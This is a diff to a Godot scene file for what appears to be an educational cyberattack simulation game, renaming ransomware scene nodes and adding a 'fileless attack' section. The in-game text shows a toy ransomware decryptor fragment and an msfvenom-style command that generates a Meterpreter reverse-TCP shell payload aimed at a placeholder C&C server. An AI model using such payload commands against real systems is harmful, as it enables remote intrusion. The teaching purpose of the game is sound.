-[node name="TextWindow" parent="DesktopEncrypted/WindowContainer" instance=ExtResource("3_7e48o")]
+[node name="TextWindow" parent="PostRansomwareEncrypt/WindowContainer" instance=ExtResource("3_7e48o")]
 visible = false
 layout_mode = 1
 anchor_left = 0.342105
@@ -1479,10 +3673,10 @@ anchor_top = 0.0769231
 anchor_right = 0.854258
 anchor_bottom = 0.65717
 
-[node name="Title" parent="DesktopEncrypted/WindowContainer/TextWindow/HBoxContainer" index="0"]
+[node name="Title" parent="PostRansomwareEncrypt/WindowContainer/TextWindow/HBoxContainer" index="0"]
 text = "text.txt"
 
-[node name="MarginContainer2" type="MarginContainer" parent="DesktopEncrypted/WindowContainer/TextWindow"]
+[node name="MarginContainer2" type="MarginContainer" parent="PostRansomwareEncrypt/WindowContainer/TextWindow"]
 layout_mode = 1
 anchors_preset = -1
 anchor_top = 0.0930232
@@ -1496,13 +3690,13 @@ theme_override_constants/margin_right = 10
 theme_override_constants/margin_bottom = 10
 metadata/_edit_use_anchors_ = true
 
-[node name="Label" type="Label" parent="DesktopEncrypted/WindowContainer/TextWindow/MarginContainer2"]
+[node name="Label" type="Label" parent="PostRansomwareEncrypt/WindowContainer/TextWindow/MarginContainer2"]
 layout_mode = 2
 size_flags_vertical = 0
 text = "jiaoosfbmsntigtwpqkvmdvuwtrovmiel"
 metadata/_edit_use_anchors_ = true
 
-[node name="KeyWindow" parent="DesktopEncrypted/WindowContainer" instance=ExtResource("3_7e48o")]
+[node name="KeyWindow" parent="PostRansomwareEncrypt/WindowContainer" instance=ExtResource("3_7e48o")]
 visible = false
 layout_mode = 2
 anchors_preset = 0
@@ -1513,7 +3707,7 @@ offset_top = -25.0
 offset_right = -25.0
 offset_bottom = -25.0
 
-[node name="Label" type="Label" parent="DesktopEncrypted/WindowContainer"]
+[node name="Label" type="Label" parent="PostRansomwareEncrypt/WindowContainer"]
 layout_mode = 1
 anchors_preset = -1
 anchor_left = 0.0154265
@@ -1526,7 +3720,7 @@ theme_override_font_sizes/font_size = 22
 text = "Now the files have been encrypted. You can view the files or press next to proceed with programming."
 metadata/_edit_use_anchors_ = true
 
-[node name="Button" type="Button" parent="DesktopEncrypted/WindowContainer"]
+[node name="Button" type="Button" parent="PostRansomwareEncrypt/WindowContainer"]
 layout_mode = 1
 anchors_preset = -1
 anchor_left = 0.886216
@@ -1540,7 +3734,7 @@ offset_bottom = 9031.54
 grow_horizontal = 0
 text = "Next"
 
-[node name="Ransomware_decrypt" type="MarginContainer" parent="." node_paths=PackedStringArray("back_button", "animation", "decryptor_window")]
+[node name="RansomwareDecrypt" type="MarginContainer" parent="." node_paths=PackedStringArray("back_button", "animation", "decryptor_window")]
 visible = false
 layout_mode = 2
 theme_override_constants/margin_left = 25
@@ -1549,14 +3743,14 @@ theme_override_constants/margin_right = 25
 theme_override_constants/margin_bottom = 25
 script = ExtResource("4_pnwk5")
 back_button = NodePath("HSplitContainer/HFlowContainer/Buttons/Back")
-animation = NodePath("HSplitContainer/CodeEdit/AnimationPlayer")
+animation = NodePath("HSplitContainer/AnimationPlayer")
 decryptor_window = NodePath("HSplitContainer/CodeEdit/DecryptorWindow")
 metadata/_tab_index = 3
 
-[node name="HSplitContainer" type="HBoxContainer" parent="Ransomware_decrypt"]
+[node name="HSplitContainer" type="HBoxContainer" parent="RansomwareDecrypt"]
 layout_mode = 2
 
-[node name="CodeEdit" type="CodeEdit" parent="Ransomware_decrypt/HSplitContainer"]
+[node name="CodeEdit" type="CodeEdit" parent="RansomwareDecrypt/HSplitContainer"]
 layout_mode = 2
 size_flags_horizontal = 3
 theme_override_colors/font_readonly_color = Color(1, 1, 1, 1)
@@ -1575,7 +3769,7 @@ print(allfiles)
 
 with open('key.key', 'rb') as key:
 		password = key.read()
-passphrase = 'WhiteHaT'
+passphrase = 'WhiteHat'
 userpass = input('Enter the password you received from us:')
 
 if userpass == passphrase:
@@ -1596,7 +3790,7 @@ gutters_draw_executing_lines = true
 gutters_draw_line_numbers = true
 gutters_zero_pad_line_numbers = true
 
-[node name="Overlay" type="ColorRect" parent="Ransomware_decrypt/HSplitContainer/CodeEdit"]
+[node name="Overlay" type="ColorRect" parent="RansomwareDecrypt/HSplitContainer/CodeEdit"]
 material = SubResource("ShaderMaterial_j4e7k")
 layout_mode = 1
 anchors_preset = 15
@@ -1606,12 +3800,7 @@ grow_horizontal = 2
 grow_vertical = 2
 mouse_filter = 2
 
-[node name="AnimationPlayer" type="AnimationPlayer" parent="Ransomware_decrypt/HSplitContainer/CodeEdit"]
-libraries = {
-&"": SubResource("AnimationLibrary_4yk5j")
-}
-
-[node name="DecryptorWindow" parent="Ransomware_decrypt/HSplitContainer/CodeEdit" instance=ExtResource("3_7e48o")]
+[node name="DecryptorWindow" parent="RansomwareDecrypt/HSplitContainer/CodeEdit" instance=ExtResource("3_7e48o")]
 visible = false
 layout_mode = 2
 anchors_preset = 0
@@ -1620,34 +3809,34 @@ anchor_top = 0.262542
 anchor_right = 0.885954
 anchor_bottom = 0.742475
 
-[node name="Title" parent="Ransomware_decrypt/HSplitContainer/CodeEdit/DecryptorWindow/HBoxContainer" index="0"]
+[node name="Title" parent="RansomwareDecrypt/HSplitContainer/CodeEdit/DecryptorWindow/HBoxContainer" index="0"]
 text = "decr.py"
 
-[node name="Label" type="Label" parent="Ransomware_decrypt/HSplitContainer/CodeEdit/DecryptorWindow/MarginContainer/VBoxContainer" index="0"]
+[node name="Label" type="Label" parent="RansomwareDecrypt/HSplitContainer/CodeEdit/DecryptorWindow/MarginContainer/VBoxContainer" index="0"]
 layout_mode = 2
 text = "Please enter the password:"
 
-[node name="HBoxContainer" type="HBoxContainer" parent="Ransomware_decrypt/HSplitContainer/CodeEdit/DecryptorWindow/MarginContainer/VBoxContainer" index="1"]
+[node name="HBoxContainer" type="HBoxContainer" parent="RansomwareDecrypt/HSplitContainer/CodeEdit/DecryptorWindow/MarginContainer/VBoxContainer" index="1"]
 layout_mode = 2
 theme_override_constants/separation = 15
 
-[node name="PasswordInput" type="TextEdit" parent="Ransomware_decrypt/HSplitContainer/CodeEdit/DecryptorWindow/MarginContainer/VBoxContainer/HBoxContainer"]
+[node name="PasswordInput" type="TextEdit" parent="RansomwareDecrypt/HSplitContainer/CodeEdit/DecryptorWindow/MarginContainer/VBoxContainer/HBoxContainer"]
 custom_minimum_size = Vector2(238.385, 0)
 layout_mode = 2
 placeholder_text = "Password"
 scroll_fit_content_height = true
 
-[node name="SubmitButton" type="Button" parent="Ransomware_decrypt/HSplitContainer/CodeEdit/DecryptorWindow/MarginContainer/VBoxContainer/HBoxContainer"]
+[node name="SubmitButton" type="Button" parent="RansomwareDecrypt/HSplitContainer/CodeEdit/DecryptorWindow/MarginContainer/VBoxContainer/HBoxContainer"]
 layout_mode = 2
 text = "Submit"
 
-[node name="Ransomware_decrypt_HSplitContainer_CodeEdit_DecryptorWindow_VBoxContainer_Header#AnimationPlayer" type="AnimationPlayer" parent="Ransomware_decrypt/HSplitContainer/CodeEdit/DecryptorWindow"]
+[node name="Ransomware_decrypt_HSplitContainer_CodeEdit_DecryptorWindow_VBoxContainer_Header#AnimationPlayer" type="AnimationPlayer" parent="RansomwareDecrypt/HSplitContainer/CodeEdit/DecryptorWindow"]
 root_node = NodePath("../../../../../../..")
 libraries = {
 &"": SubResource("AnimationLibrary_vfaog")
 }
 
-[node name="PasswordCheckComponent" type="Control" parent="Ransomware_decrypt/HSplitContainer/CodeEdit/DecryptorWindow" node_paths=PackedStringArray("password_box", "message_label")]
+[node name="PasswordCheckComponent" type="Control" parent="RansomwareDecrypt/HSplitContainer/CodeEdit/DecryptorWindow" node_paths=PackedStringArray("password_box", "message_label")]
 anchors_preset = 0
 offset_right = 40.0
 offset_bottom = 40.0
@@ -1655,12 +3844,12 @@ script = ExtResource("10_xi5cb")
 password_box = NodePath("../MarginContainer/VBoxContainer/HBoxContainer/PasswordInput")
 message_label = NodePath("../MarginContainer/VBoxContainer/Label")
 
-[node name="HFlowContainer" type="HFlowContainer" parent="Ransomware_decrypt/HSplitContainer"]
+[node name="HFlowContainer" type="HFlowContainer" parent="RansomwareDecrypt/HSplitContainer"]
 layout_mode = 2
 alignment = 1
 last_wrap_alignment = 2
 
-[node name="RichTextLabel" type="RichTextLabel" parent="Ransomware_decrypt/HSplitContainer/HFlowContainer"]
+[node name="RichTextLabel" type="RichTextLabel" parent="RansomwareDecrypt/HSplitContainer/HFlowContainer"]
 texture_filter = 1
 layout_mode = 2
 size_flags_horizontal = 3
@@ -1668,42 +3857,296 @@ theme_override_font_sizes/normal_font_size = 18
 text = "Create the code for the good shit"
 fit_content = true
 
-[node name="Buttons" type="HBoxContainer" parent="Ransomware_decrypt/HSplitContainer/HFlowContainer"]
+[node name="Buttons" type="HBoxContainer" parent="RansomwareDecrypt/HSplitContainer/HFlowContainer"]
 self_modulate = Color(1, 1, 1, 0)
 layout_mode = 2
 size_flags_vertical = 8
 theme_override_constants/separation = 165
 
-[node name="Back" type="Button" parent="Ransomware_decrypt/HSplitContainer/HFlowContainer/Buttons"]
+[node name="Back" type="Button" parent="RansomwareDecrypt/HSplitContainer/HFlowContainer/Buttons"]
 layout_mode = 2
 theme_override_font_sizes/font_size = 18
 text = "Back"
 metadata/_edit_use_anchors_ = true
 
-[node name="Next" type="Button" parent="Ransomware_decrypt/HSplitContainer/HFlowContainer/Buttons"]
+[node name="Next" type="Button" parent="RansomwareDecrypt/HSplitContainer/HFlowContainer/Buttons"]
 layout_mode = 2
 theme_override_font_sizes/font_size = 18
 text = "Next"
 metadata/_edit_use_anchors_ = true
 
-[connection signal="pressed" from="DesktopDefault/Desktop/Malware_icon/Button" to="." method="_on_button_pressed"]
-[connection signal="pressed" from="DesktopDefault/Desktop/Decr_icon/Button" to="." method="_on_button_pressed"]
-[connection signal="ransomware_start" from="DesktopDefault/WindowContainer" to="." method="_on_window_container_ransomware_start"]
-[connection signal="item_hovered" from="DesktopDefault/WindowContainer/RadialMenu" to="DesktopDefault/WindowContainer" method="_on_radial_menu_item_hovered"]
-[connection signal="item_selected" from="DesktopDefault/WindowContainer/RadialMenu" to="DesktopDefault/WindowContainer" method="_on_radial_menu_item_selected"]
-[connection signal="pressed" from="DesktopDefault/Cyber_attack_Cards/VBoxContainer/Ransomware_card/Button" to="." method="_ransomware_button_pressed"]
-[connection signal="pressed" from="Ransomware_encrypt/HSplitContainer/CodeEdit/Window/MarginContainer/VBoxContainer/FInish" to="." method="_on_finish_pressed"]
-[connection signal="button_down" from="Ransomware_encrypt/HSplitContainer/HFlowContainer/Buttons/Back" to="Ransomware_encrypt" method="_on_back_button_down"]
-[connection signal="button_down" from="Ransomware_encrypt/HSplitContainer/HFlowContainer/Buttons/Next" to="Ransomware_encrypt" method="_on_next_button_down"]
-[connection signal="pressed" from="DesktopEncrypted/Desktop/Malware_icon/Button" to="." method="_on_button_pressed"]
-[connection signal="ransomware_start" from="DesktopEncrypted/WindowContainer" to="." method="_on_window_container_ransomware_start"]
-[connection signal="button_down" from="DesktopEncrypted/WindowContainer/Button" to="." method="_on_button_button_down"]
-[connection signal="window_exited" from="Ransomware_decrypt/HSplitContainer/CodeEdit/DecryptorWindow" to="." method="_on_decryptor_window_window_exited"]
-[connection signal="pressed" from="Ransomware_decrypt/HSplitContainer/CodeEdit/DecryptorWindow/MarginContainer/VBoxContainer/HBoxContainer/SubmitButton" to="Ransomware_decrypt/HSplitContainer/CodeEdit/DecryptorWindow/PasswordCheckComponent" method="_on_ransomware_decrypt_submit_button_pressed"]
-[connection signal="correct_password" from="Ransomware_decrypt/HSplitContainer/CodeEdit/DecryptorWindow/PasswordCheckComponent" to="." method="_on_password_check_component_correct_password"]
-[connection signal="button_down" from="Ransomware_decrypt/HSplitContainer/HFlowContainer/Buttons/Back" to="Ransomware_decrypt" method="_on_back_button_down"]
-[connection signal="button_down" from="Ransomware_decrypt/HSplitContainer/HFlowContainer/Buttons/Next" to="Ransomware_decrypt" method="_on_next_button_down"]
+[node name="AnimationPlayer" type="AnimationPlayer" parent="RansomwareDecrypt/HSplitContainer"]
+root_node = NodePath("../CodeEdit")
+libraries = {
+&"": SubResource("AnimationLibrary_4yk5j")
+}
 
+[node name="BruteforceDesktop" parent="." instance=ExtResource("14_8imo2")]
+visible = false
+layout_mode = 2
+metadata/_tab_index = 4
+
+[node name="Fileless" type="MarginContainer" parent="." node_paths=PackedStringArray("animation")]
+layout_mode = 2
+theme_override_constants/margin_left = 25
+theme_override_constants/margin_top = 25
+theme_override_constants/margin_right = 25
+theme_override_constants/margin_bottom = 25
+script = ExtResource("15_lko46")
+animation = NodePath("AnimationPlayer")
+metadata/_tab_index = 5
+
+[node name="HSplitContainer" type="HBoxContainer" parent="Fileless"]
+layout_mode = 2
+
+[node name="CodeEdit" type="CodeEdit" parent="Fileless/HSplitContainer"]
+layout_mode = 2
+size_flags_horizontal = 3
+theme_override_font_sizes/font_size = 18
+text = "root@cali :~ # msfpoison -p windows/meterpreter/reverse_tcp LHOST=
+<C&C Server IP Address>  LPORT=<C&C Server Port> --platform windowds 
+--arch x86 -f c -o shellcode.txt
+
+[-] No platform was selected, choosing Msf::Module::Platform::Windows 
+from the payload"
+gutters_draw_breakpoints_gutter = true
+gutters_draw_bookmarks = true
+gutters_draw_executing_lines = true
+gutters_draw_line_numbers = true
+gutters_zero_pad_line_numbers = true
+
+[node name="Overlay" type="ColorRect" parent="Fileless/HSplitContainer/CodeEdit"]
+material = SubResource("ShaderMaterial_3jqaa")
+layout_mode = 1
+anchors_preset = 15
+anchor_right = 1.0
+anchor_bottom = 1.0
+grow_horizontal = 2
+grow_vertical = 2
+mouse_filter = 2
+
+[node name="shellcode_generated_window" parent="Fileless/HSplitContainer/CodeEdit" instance=ExtResource("3_7e48o")]
+visible = false
+layout_mode = 1
+anchor_left = 0.232893
+anchor_top = 0.200669
+anchor_right = 0.813926
+anchor_bottom = 0.795987
+
+[node name="Title" parent="Fileless/HSplitContainer/CodeEdit/shellcode_generated_window/HBoxContainer" index="0"]
+text = "Creating boilerplate application"
+
+[node name="MarginContainer" parent="Fileless/HSplitContainer/CodeEdit/shellcode_generated_window" index="2"]
+anchors_preset = -1
+anchor_top = 0.112359
+offset_top = 0.0
+offset_right = 0.0
+offset_bottom = 3.05176e-05
+
+[node name="VBoxContainer" parent="Fileless/HSplitContainer/CodeEdit/shellcode_generated_window/MarginContainer" index="0"]
+visible = false
+
+[node name="RansomwareApp" type="ProgressBar" parent="Fileless/HSplitContainer/CodeEdit/shellcode_generated_window"]
+layout_mode = 0
+anchor_left = 0.0843835
+anchor_top = 0.273785
+anchor_right = 0.888371
+anchor_bottom = 0.377535
+
+[node name="Label" type="Label" parent="Fileless/HSplitContainer/CodeEdit/shellcode_generated_window"]
+layout_mode = 1
+anchors_preset = -1
+anchor_left = 0.0599175
+anchor_top = 0.157303
+anchor_right = 0.650826
+anchor_bottom = 0.22191
+text = "Payload Created!!!"
+metadata/_edit_use_anchors_ = true
+
+[node name="HFlowContainer" type="HFlowContainer" parent="Fileless/HSplitContainer"]
+layout_mode = 2
+alignment = 1
+last_wrap_alignment = 2
+
+[node name="RichTextLabel" type="RichTextLabel" parent="Fileless/HSplitContainer/HFlowContainer"]
+texture_filter = 1
+layout_mode = 2
+size_flags_horizontal = 3
+theme_override_font_sizes/normal_font_size = 18
+text = "You didn’t type --platform windows, but because your payload (windows/meterpreter/reverse_tcp) is clearly for Windows, msfvenom guessed and set it to Windows automatically."
+fit_content = true
+
+[node name="Buttons" type="HBoxContainer" parent="Fileless/HSplitContainer/HFlowContainer"]
+self_modulate = Color(1, 1, 1, 0)
+layout_mode = 2
+size_flags_vertical = 8
+theme_override_constants/separation = 165
+
+[node name="Back" type="Button" parent="Fileless/HSplitContainer/HFlowContainer/Buttons"]
+layout_mode = 2
+theme_override_font_sizes/font_size = 18
+text = "Back"
+metadata/_edit_use_anchors_ = true
+
+[node name="Next" type="Button" parent="Fileless/HSplitContainer/HFlowContainer/Buttons"]
+layout_mode = 2
+theme_override_font_sizes/font_size = 18
+text = "Next"
+metadata/_edit_use_anchors_ = true
+
+[node name="FakeNext" type="Button" parent="Fileless/HSplitContainer/HFlowContainer/Buttons"]
+visible = false
+layout_mode = 2
+theme_override_font_sizes/font_size = 18
+text = "Next"
+metadata/_edit_use_anchors_ = true
+
+[node name="AnimationPlayer" type="AnimationPlayer" parent="Fileless"]
+libraries = {
+&"": SubResource("AnimationLibrary_o4fi6")
+}
+
+[node name="FilelessDesktop" type="MarginContainer" parent="."]
+visible = false
+layout_mode = 2
+theme_override_constants/margin_left = 25
+theme_override_constants/margin_top = 25
+theme_override_constants/margin_right = 25
+theme_override_constants/margin_bottom = 25
+metadata/_tab_index = 6
+
+[node name="Desktop" type="VFlowContainer" parent="FilelessDesktop"]
+layout_mode = 2
+theme_override_constants/h_separation = 20
+
+[node name="TerminalIcon" parent="FilelessDesktop/Desktop" instance=ExtResource("1_vsxan")]
+layout_mode = 2
+script = null
+
+[node name="Button" parent="FilelessDesktop/Desktop/TerminalIcon" index="0"]
+theme_override_styles/disabled = SubResource("StyleBoxTexture_03xvr")
+icon = ExtResource("7_8h5wy")
+
+[node name="Label" parent="FilelessDesktop/Desktop/TerminalIcon" index="1"]
+text = "Terminal"
+
+[node name="MyDriveIcon" parent="FilelessDesktop/Desktop" instance=ExtResource("1_vsxan")]
+layout_mode = 2
+script = null
+
+[node name="Button" parent="FilelessDesktop/Desktop/MyDriveIcon" index="0"]
+theme_override_styles/disabled = SubResource("StyleBoxTexture_b0i1v")
+disabled = true
+icon = ExtResource("4_gq7c2")
+
+[node name="Label" parent="FilelessDesktop/Desktop/MyDriveIcon" index="1"]
+text = "My Drive"
+
+[node name="shellcode" parent="FilelessDesktop/Desktop" instance=ExtResource("1_vsxan")]
+visible = false
+layout_mode = 2
+script = null
+
+[node name="Button" parent="FilelessDesktop/Desktop/shellcode" index="0"]
+icon = ExtResource("6_d3ylh")
+
+[node name="Label" parent="FilelessDesktop/Desktop/shellcode" index="1"]
+theme_override_font_sizes/font_size = 20
+text = "shellcode.txt"
+
+[node name="boilerplate" parent="FilelessDesktop/Desktop" instance=ExtResource("1_vsxan")]
+visible = false
+layout_mode = 2
+script = null
+
+[node name="Button" parent="FilelessDesktop/Desktop/boilerplate" index="0"]
+icon = ExtResource("16_6er24")
+
+[node name="Label" parent="FilelessDesktop/Desktop/boilerplate" index="1"]
+theme_override_font_sizes/font_size = 21
+text = "boilerplate.exe"
+
+[node name="WindowContainer" type="Control" parent="FilelessDesktop" node_paths=PackedStringArray("cyberattack_lbl")]
+visible = false
+layout_mode = 2
+mouse_filter = 2
+script = ExtResource("1_ootqi")
+cyberattack_lbl = NodePath("Label")
+ransomware_recon_done = true
+
+[node name="shellcode_txt" parent="FilelessDesktop/WindowContainer" instance=ExtResource("3_7e48o")]
+layout_mode = 1
+anchor_left = 0.342105
+anchor_top = 0.0769231
+anchor_right = 0.854258
+anchor_bottom = 0.65717
+
+[node name="Title" parent="FilelessDesktop/WindowContainer/shellcode_txt/HBoxContainer" index="0"]
+text = "shellcode.txt"
+
+[node name="VBoxContainer" parent="FilelessDesktop/WindowContainer/shellcode_txt/MarginContainer" index="0"]
+custom_minimum_size = Vector2(59, 0)
+
+[node name="move to usb" parent="FilelessDesktop/WindowContainer" instance=ExtResource("3_7e48o")]
+visible = false
+layout_mode = 2
+anchors_preset = 0
+anchor_left = 0.329401
+anchor_top = 0.083612
+anchor_right = 0.854809
+anchor_bottom = 0.680602
+offset_left = -3.99988
+offset_top = 18.0
+offset_right = -3.99988
+offset_bottom = 18.0
+
+[node name="Title" parent="FilelessDesktop/WindowContainer/move to usb/HBoxContainer" index="0"]
+text = "My Drive"
+
+[node name="RansomwareApp" type="ProgressBar" parent="FilelessDesktop/WindowContainer/move to usb"]
+layout_mode = 1
+anchors_preset = -1
+anchor_left = 0.0843835
+anchor_top = 0.273785
+anchor_right = 0.888371
+anchor_bottom = 0.377535
+
+[node name="Label" type="Label" parent="FilelessDesktop/WindowContainer/move to usb"]
+layout_mode = 1
+anchors_preset = -1
+anchor_left = 0.0599175
+anchor_top = 0.157303
+anchor_right = 0.650826
+anchor_bottom = 0.22191
+text = "shellcode.txt copied to Flashdrive!!!"
+metadata/_edit_use_anchors_ = true
+
+[node name="Label" type="Label" parent="FilelessDesktop/WindowContainer"]
+layout_mode = 1
+anchors_preset = -1
+anchor_top = 0.948161
+anchor_right = 1.0
+anchor_bottom = 1.0
+grow_horizontal = 2
+grow_vertical = 0
+theme_override_font_sizes/font_size = 22
+text = "Great! The application has now been created as seen here, Let's copy it into our flashdrive"
+metadata/_edit_use_anchors_ = true
+
+[connection signal="cyberattack_selected" from="DesktopDefault" to="." method="_on_desktop_default_cyberattack_selected"]
+[connection signal="pressed" from="RansomwareEncrypt/HSplitContainer/CodeEdit/Window/MarginContainer/VBoxContainer/FInish" to="." method="_on_finish_pressed"]
+[connection signal="button_down" from="RansomwareEncrypt/HSplitContainer/HFlowContainer/Buttons/Back" to="RansomwareEncrypt" method="_on_back_button_down"]
+[connection signal="button_down" from="RansomwareEncrypt/HSplitContainer/HFlowContainer/Buttons/Next" to="RansomwareEncrypt" method="_on_next_button_down"]
+[connection signal="pressed" from="PostRansomwareEncrypt/Desktop/Malware_icon/Button" to="." method="_on_button_pressed"]
+[connection signal="ransomware_start" from="PostRansomwareEncrypt/WindowContainer" to="." method="_on_window_container_ransomware_start"]
+[connection signal="button_down" from="PostRansomwareEncrypt/WindowContainer/Button" to="." method="_on_button_button_down"]
+[connection signal="window_exited" from="RansomwareDecrypt/HSplitContainer/CodeEdit/DecryptorWindow" to="." method="_on_decryptor_window_window_exited"]
+[connection signal="pressed" from="RansomwareDecrypt/HSplitContainer/CodeEdit/DecryptorWindow/MarginContainer/VBoxContainer/HBoxContainer/SubmitButton" to="RansomwareDecrypt/HSplitContainer/CodeEdit/DecryptorWindow/PasswordCheckComponent" method="_on_ransomware_decrypt_submit_button_pressed"]
+[connection signal="correct_password" from="RansomwareDecrypt/HSplitContainer/CodeEdit/DecryptorWindow/PasswordCheckComponent" to="." method="_on_password_check_component_correct_password"]
+[connection signal="button_down" from="RansomwareDecrypt/HSplitContainer/HFlowContainer/Buttons/Back" to="RansomwareDecrypt" method="_on_back_button_down"]
+[connection signal="button_down" from="RansomwareDecrypt/HSplitContainer/HFlowContainer/Buttons/Next" to="RansomwareDecrypt" method="_on_next_button_down"]
+
+[editable path="DesktopDefault"]
 [editable path="DesktopDefault/Desktop/Data_icon"]
 [editable path="DesktopDefault/Desktop/Godot_icon"]
 [editable path="DesktopDefault/Desktop/Text_icon"]
@@ -1718,14 +4161,21 @@ metadata/_edit_use_anchors_ = true
 [editable path="DesktopDefault/Cyber_attack_Cards/VBoxContainer/Phishing_card"]
 [editable path="DesktopDefault/Cyber_attack_Cards/VBoxContainer/Fileless_card"]
 [editable path="DesktopDefault/Cyber_attack_Cards/VBoxContainer/DoS_card"]
-[editable path="Ransomware_encrypt/HSplitContainer/CodeEdit/Window"]
-[editable path="DesktopEncrypted/Desktop/Data_icon"]
-[editable path="DesktopEncrypted/Desktop/Godot_icon"]
-[editable path="DesktopEncrypted/Desktop/Text_icon"]
-[editable path="DesktopEncrypted/Desktop/Malware_icon"]
-[editable path="DesktopEncrypted/Desktop/Key_icon"]
-[editable path="DesktopEncrypted/WindowContainer/GodotWindow"]
-[editable path="DesktopEncrypted/WindowContainer/SQLWindow"]
-[editable path="DesktopEncrypted/WindowContainer/TextWindow"]
-[editable path="DesktopEncrypted/WindowContainer/KeyWindow"]
-[editable path="Ransomware_decrypt/HSplitContainer/CodeEdit/DecryptorWindow"]
+[editable path="RansomwareEncrypt/HSplitContainer/CodeEdit/Window"]
+[editable path="PostRansomwareEncrypt/Desktop/Data_icon"]
+[editable path="PostRansomwareEncrypt/Desktop/Godot_icon"]
+[editable path="PostRansomwareEncrypt/Desktop/Text_icon"]
+[editable path="PostRansomwareEncrypt/Desktop/Malware_icon"]
+[editable path="PostRansomwareEncrypt/Desktop/Key_icon"]
+[editable path="PostRansomwareEncrypt/WindowContainer/GodotWindow"]
+[editable path="PostRansomwareEncrypt/WindowContainer/SQLWindow"]
+[editable path="PostRansomwareEncrypt/WindowContainer/TextWindow"]
+[editable path="PostRansomwareEncrypt/WindowContainer/KeyWindow"]
+[editable path="RansomwareDecrypt/HSplitContainer/CodeEdit/DecryptorWindow"]
+[editable path="Fileless/HSplitContainer/CodeEdit/shellcode_generated_window"]
+[editable path="FilelessDesktop/Desktop/TerminalIcon"]
+[editable path="FilelessDesktop/Desktop/MyDriveIcon"]
+[editable path="FilelessDesktop/Desktop/shellcode"]
+[editable path="FilelessDesktop/Desktop/boilerplate"]
+[editable path="FilelessDesktop/WindowContainer/shellcode_txt"]
+[editable path="FilelessDesktop/WindowContainer/move to usb"]
